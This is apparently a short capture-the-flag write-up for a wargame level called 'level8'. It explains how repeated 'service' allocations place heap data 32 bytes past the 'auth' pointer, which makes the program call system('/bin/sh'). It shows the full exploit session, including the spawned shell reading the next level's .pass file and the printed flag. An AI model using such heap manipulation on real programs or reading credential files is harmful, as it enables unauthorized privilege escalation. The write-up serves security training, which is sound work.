When we observe the main, we know we need to have something at the variable auth + 32 bytes to launch `system("/bin/sh")`. \
But how are we supposed to do that, when the buffer we write to is blocked at 30 bytes ? \
Let's run the program, to see the addresses of the allocated zones: 
```shell
$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
|_ our first malloc is at this address
service
0x804a008, 0x804a018
	   |_ the second malloc (aka strdup) is at this address
service (we do that again so with malloc's alignment, it will return an address at +16 bytes, which will be just 32 bytes after our first address)
0x804a008, 0x804a028
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
